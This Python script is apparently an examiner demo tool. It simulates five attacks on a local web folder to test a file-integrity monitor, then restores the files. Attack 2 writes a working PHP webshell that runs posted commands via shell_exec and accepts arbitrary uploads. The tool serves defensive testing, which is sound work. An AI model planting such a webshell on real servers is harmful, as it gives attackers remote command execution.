import os
import sys
import time
import shutil
import sqlite3
from pathlib import Path

# ── Path resolution ───────────────────────────────────────────────────────────
# All paths are resolved relative to this script's location so the
# simulator works regardless of which directory python is launched from.

SCRIPT_DIR    = Path(__file__).resolve().parent
WEB_DIR       = SCRIPT_DIR / "Web_Server_Files"
ORIGINALS_DIR = SCRIPT_DIR / "_demo_originals"
DB_PATH       = SCRIPT_DIR / "fim.db"
MONITOR_PY    = SCRIPT_DIR / "monitor.py"

# ── Colour helpers (Windows 10+ and all Unix terminals support ANSI) ──────────

def red(t):    return f"\033[91m{t}\033[0m"
def green(t):  return f"\033[92m{t}\033[0m"
def yellow(t): return f"\033[93m{t}\033[0m"
def cyan(t):   return f"\033[96m{t}\033[0m"
def bold(t):   return f"\033[1m{t}\033[0m"

# ── Pre-flight checks ─────────────────────────────────────────────────────────

def preflight():
    """Warn if the web folder or originals backup is missing."""
    ok = True
    if not WEB_DIR.exists():
        print(red(f"  ERROR: Web_Server_Files/ not found at {WEB_DIR}"))
        print(red("  Create the folder and place the demo website files inside it."))
        ok = False
    if not ORIGINALS_DIR.exists():
        print(yellow("  WARNING: _demo_originals/ not found — Reset (option 6) will not work."))
    return ok

# ── Banner ────────────────────────────────────────────────────────────────────

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(bold(cyan("=" * 60)))
    print(bold(cyan("   FIM Attack Simulator — Examiner Demo Tool")))
    print(bold(cyan("   Real-Time File Integrity & Security Monitoring")))
    print(bold(cyan("=" * 60)))
    print()
    if not DB_PATH.exists():
        print(yellow("  NOTE: fim.db not found — start monitor.py first, then"))
        print(yellow("  generate some alerts before running Attack 4."))
        print()

def menu():
    print(bold("  Select an attack scenario:\n"))
    print(f"  {cyan('1')}  Web Defacement        "
          f"— modifies index.html          [{red('MITRE T1565.001')}]")
    print(f"  {cyan('2')}  Backdoor Injection    "
          f"— creates shell.php            [{red('MITRE T1105')}]")
    print(f"  {cyan('3')}  Ransomware Simulation "
          f"— deletes 3 site files         [{red('MITRE T1070.004')}]")
    print(f"  {cyan('4')}  Audit Chain Tamper    "
          f"— corrupts a DB chain entry    [{red('MITRE N/A — log attack')}]")
    print(f"  {cyan('5')}  FIM Self-Tamper       "
          f"— modifies monitor.py          [{red('MITRE T1562.001')}]")
    print(f"  {cyan('6')}  {green('Reset Demo Files')}      "
          f"— restores everything to original state")
    print(f"  {cyan('0')}  Exit")
    print()
    print(bold("  " + "─" * 56))
    print()

# ══════════════════════════════════════════════════════════════════════════════
# ATTACK 1 — Web Defacement
# ══════════════════════════════════════════════════════════════════════════════

def attack_defacement():
    target = WEB_DIR / "index.html"
    print()
    print(bold(red("  ══ ATTACK 1: Web Defacement ══")))
    print()
    print(f"  Target : {target}")
    print(f"  Action : Overwriting index.html with attacker content")
    print(f"  MITRE  : T1565.001 — Stored Data Manipulation")
    print()

    defacement_content = """\
<!DOCTYPE html>
<html>
<head><title>HACKED</title>
<style>
body { background: #000; color: #ff0000; font-family: monospace;
       display: flex; justify-content: center; align-items: center;
       height: 100vh; margin: 0; flex-direction: column; }
h1 { font-size: 5rem; text-shadow: 0 0 20px #ff0000; }
p  { font-size: 1.2rem; color: #ff6666; margin-top: 1rem; }
</style>
</head>
<body>
  <h1>&#x2620; HACKED &#x2620;</h1>
  <p>This site has been compromised by PHANTOM_SL</p>
  <p>Your security is a joke. All data has been copied.</p>
  <p style="margin-top:2rem;font-size:0.8rem;color:#555;">
    TechSolutions Lanka — defaced 2025-05-15 03:47 UTC
  </p>
</body>
</html>
"""
    target.write_text(defacement_content, encoding="utf-8")
    print(green("  [DONE] index.html has been defaced."))
    print()
    print(bold("  What to watch on the dashboard:"))
    print("  • Alerts page → new HIGH row for index.html")
    print("  • Event type  : MODIFIED")
    print("  • Severity    : HIGH")
    print("  • MITRE tag   : T1565.001")
    print("  • Hash-before ≠ Hash-after (both columns populated)")
    print()
    print(yellow("  Typical detection latency: 2–4 seconds after this script exits."))
    print()
    input("  Press Enter to return to the menu...")

# ══════════════════════════════════════════════════════════════════════════════
# ATTACK 2 — Backdoor Injection
# ══════════════════════════════════════════════════════════════════════════════

def attack_backdoor():
    target = WEB_DIR / "shell.php"
    print()
    print(bold(red("  ══ ATTACK 2: Backdoor Injection ══")))
    print()
    print(f"  Target : {target}")
    print(f"  Action : Creating a PHP webshell in the web root")
    print(f"  MITRE  : T1105 — Ingress Tool Transfer / T1505.003 Web Shell")
    print()

    shell_content = """\
<?php
/**
 * r57 variant webshell — planted by attacker
 * Provides remote command execution via HTTP POST
 */
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo '<pre>' . shell_exec($cmd) . '</pre>';
}
if (isset($_POST['upload']) && isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'],
                       basename($_FILES['file']['name']));
    echo 'Uploaded: ' . basename($_FILES['file']['name']);
}
?>
<!DOCTYPE html><html><body>
<form method="POST">
  Command: <input name="cmd" size="60">
  <input type="submit" value="Execute">
</form>
<form method="POST" enctype="multipart/form-data">
  Upload: <input type="file" name="file">
  <input type="hidden" name="upload" value="1">
  <input type="submit" value="Upload">
</form>
</body></html>
"""
    target.write_text(shell_content, encoding="utf-8")
    print(green("  [DONE] shell.php has been created in Web_Server_Files/."))
    print()
    print(bold("  What to watch on the dashboard:"))
    print("  • Alerts page → new row for shell.php")
    print("  • Event type  : NEW_FILE")
    print("  • Severity    : HIGH (or MEDIUM depending on severity rules)")
    print("  • MITRE tag   : T1105")
    print("  • Hash-before : (empty — file did not previously exist)")
    print("  • Hash-after  : SHA-256 of the shell content")
    print()
    print(yellow("  Tip: Add a severity rule for '.php' → HIGH in the"))
    print(yellow("  Configuration page to see automatic classification upgrade."))
    print()
    input("  Press Enter to return to the menu...")

# ══════════════════════════════════════════════════════════════════════════════
# ATTACK 3 — Ransomware Simulation
# ══════════════════════════════════════════════════════════════════════════════

def attack_ransomware():
    targets = [
        WEB_DIR / "about.html",
        WEB_DIR / "contact.html",
        WEB_DIR / "assets" / "style.css",
    ]
    print()
    print(bold(red("  ══ ATTACK 3: Ransomware Simulation ══")))
    print()
    print(f"  Action : Deleting {len(targets)} site files simultaneously")
    print(f"  MITRE  : T1070.004 — Indicator Removal: File Deletion")
    print()

    deleted = []
    for path in targets:
        if path.exists():
            path.unlink()
            deleted.append(path.name)
            print(f"  {red('DELETED')} {path.relative_to(SCRIPT_DIR)}")
        else:
            print(yellow(f"  SKIPPED {path.name} (already missing — run Reset first)"))

    print()
    if deleted:
        print(green(f"  [DONE] {len(deleted)} file(s) deleted."))
        print()
        print(bold("  What to watch on the dashboard:"))
        print(f"  • Alerts page → {len(deleted)} new HIGH rows, one per deleted file")
        print("  • Event type  : DELETED")
        print("  • Severity    : HIGH")
        print("  • MITRE tag   : T1070.004")
        print()
        print(bold("  Auto-restore behaviour (if AUTO_RESTORE_ON_DELETE=true in .env):"))
        print("  • Files are restored from Backup/ within ~2 seconds")
        print("  • Open Windows Explorer on Web_Server_Files/ to watch them reappear")
        print("  • A second alert is NOT raised for the restore — it is an internal action")
        print()
        print(yellow("  If files do NOT reappear: check that python baseline.py was run"))
        print(yellow("  before python monitor.py so the Backup/ snapshot exists."))
    else:
        print(yellow("  No files were deleted. Run option 6 (Reset) first."))
    print()
    input("  Press Enter to return to the menu...")

# ══════════════════════════════════════════════════════════════════════════════
# ATTACK 4 — Audit Chain Tamper
# ══════════════════════════════════════════════════════════════════════════════

def attack_chain_tamper():
    print()
    print(bold(red("  ══ ATTACK 4: Audit Chain Tampering ══")))
    print()
    print("  Simulates an attacker editing the audit database directly")
    print("  to erase evidence of a previous intrusion.")
    print()

    if not DB_PATH.exists():
        print(red("  ERROR: fim.db not found."))
        print(red("  Start monitor.py and generate at least one alert first,"))
        print(red("  then run this attack."))
        print()
        input("  Press Enter to return to the menu...")
        return

    conn = sqlite3.connect(str(DB_PATH))
    c    = conn.cursor()

    c.execute("SELECT COUNT(*) FROM chained_alerts")
    count = c.fetchone()[0]

    if count == 0:
        print(yellow("  The chained_alerts table is empty."))
        print(yellow("  Trigger some file events first (run attacks 1, 2 or 3),"))
        print(yellow("  wait for the monitor to log them, then re-run this attack."))
        conn.close()
        print()
        input("  Press Enter to return to the menu...")
        return

    # Find the lowest chain entry and corrupt it
    c.execute("SELECT MIN(id) FROM chained_alerts")
    target_id = c.fetchone()[0]

    c.execute("SELECT alert_data FROM chained_alerts WHERE id = ?", (target_id,))
    original = c.fetchone()[0]

    c.execute(
        "UPDATE chained_alerts SET alert_data = ? WHERE id = ?",
        ("** EVIDENCE DELETED BY ATTACKER **", target_id)
    )
    conn.commit()
    conn.close()

    print(f"  Chain entries found : {count}")
    print(f"  Entry tampered      : id = {target_id}")
    print(f"  Original data       : {original[:80]}...")
    print(f"  Replaced with       : ** EVIDENCE DELETED BY ATTACKER **")
    print()
    print(green("  [DONE] Database entry corrupted."))
    print()
    print(bold("  What to watch on the dashboard:"))
    print("  • Navigate to Chain Verify page")
    print("  • Click 'Verify Chain Integrity'")
    print("  • The system reports: TAMPER DETECTED at entry id =", target_id)
    print("  • Both the hash chain AND the HMAC layer will flag the corruption")
    print()
    print(bold("  Why this matters:"))
    print("  A plain hash chain can be defeated by an attacker who rebuilds")
    print("  the entire chain from scratch. The HMAC layer prevents this —")
    print("  without the secret key, the attacker cannot produce valid MACs.")
    print()
    input("  Press Enter to return to the menu...")

# ══════════════════════════════════════════════════════════════════════════════
# ATTACK 5 — FIM Self-Tampering
# ══════════════════════════════════════════════════════════════════════════════

def attack_self_tamper():
    target = MONITOR_PY
    print()
    print(bold(red("  ══ ATTACK 5: FIM Self-Tampering ══")))
    print()
    print(f"  Target : {target}")
    print("  Action : Appending attacker comment to monitor.py")
    print("  MITRE  : T1562.001 — Impair Defenses: Disable or Modify Tools")
    print()
    print("  Real-world scenario: an attacker gains write access to the server")
    print("  and modifies the monitoring script to disable alerting for")
    print("  specific file paths, allowing future intrusions to go undetected.")
    print()

    if not target.exists():
        print(red(f"  ERROR: monitor.py not found at {target}"))
        print(red("  Make sure you are running this script from the project root."))
        print()
        input("  Press Enter to return to the menu...")
        return

    marker = "\n# [ATTACKER MODIFICATION] alert suppression injected 2025-05-15\n"

    with open(target, "a", encoding="utf-8") as f:
        f.write(marker)

    print(green("  [DONE] monitor.py has been modified."))
    print()
    print(bold("  What to watch on the dashboard:"))
    print("  • Self-Integrity page → status changes to COMPROMISED")
    print("  • Alerts page         → HIGH alert for monitor.py")
    print("  • Event type          : MODIFIED (self-watcher detection)")
    print("  • MITRE tag           : T1562.001")
    print()
    print(yellow(f"  Detection latency: up to 30 seconds (self-watcher polling interval)."))
    print(yellow("  Run option 6 (Reset) to remove the injected line from monitor.py."))
    print()
    input("  Press Enter to return to the menu...")

# ══════════════════════════════════════════════════════════════════════════════
# RESET — Restore everything to original state
# ══════════════════════════════════════════════════════════════════════════════

def reset_demo():
    print()
    print(bold(green("  ══ RESET: Restoring Demo Files ══")))
    print()

    if not ORIGINALS_DIR.exists():
        print(red("  ERROR: _demo_originals/ folder not found."))
        print(red("  Cannot restore. Copy the original Web_Server_Files manually."))
        print()
        input("  Press Enter to return to the menu...")
        return

    # Restore all web files from _demo_originals
    restored = 0
    for src in ORIGINALS_DIR.rglob("*"):
        if src.is_file():
            rel  = src.relative_to(ORIGINALS_DIR)
            dst  = WEB_DIR / rel
            dst.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(str(src), str(dst))
            print(f"  {green('RESTORED')} {rel}")
            restored += 1

    # Remove shell.php if it was created by attack 2
    shell = WEB_DIR / "shell.php"
    if shell.exists():
        shell.unlink()
        print(f"  {red('REMOVED')} shell.php (backdoor cleaned up)")

    # Remove the self-tamper marker from monitor.py
    marker = "# [ATTACKER MODIFICATION] alert suppression injected 2025-05-15\n"
    if MONITOR_PY.exists():
        content = MONITOR_PY.read_text(encoding="utf-8")
        if marker in content:
            MONITOR_PY.write_text(
                content.replace("\n" + marker, "").replace(marker, ""),
                encoding="utf-8"
            )
            print(f"  {green('CLEANED')} monitor.py (attacker line removed)")

    print()
    print(green(f"  [DONE] {restored} file(s) restored. Demo is ready for another run."))
    print()
    print(yellow("  NOTE: The FIM database (fim.db) is NOT reset. All previously"))
    print(yellow("  generated alerts remain visible on the dashboard — this is"))
    print(yellow("  intentional so you can show the accumulated audit history."))
    print(yellow("  Delete fim.db manually if you want a completely clean slate."))
    print()
    input("  Press Enter to return to the menu...")

# ══════════════════════════════════════════════════════════════════════════════
# MAIN LOOP
# ══════════════════════════════════════════════════════════════════════════════

def main():
    if not preflight():
        sys.exit(1)

    dispatch = {
        "1": attack_defacement,
        "2": attack_backdoor,
        "3": attack_ransomware,
        "4": attack_chain_tamper,
        "5": attack_self_tamper,
        "6": reset_demo,
    }

    while True:
        banner()
        menu()
        choice = input("  Enter choice (0–6): ").strip()
        if choice == "0":
            print()
            print(green("  Exiting attack simulator. Dashboard remains running."))
            print()
            sys.exit(0)
        elif choice in dispatch:
            dispatch[choice]()
        else:
            print(yellow("\n  Invalid choice. Please enter a number between 0 and 6.\n"))
            time.sleep(1)

if __name__ == "__main__":
    main()
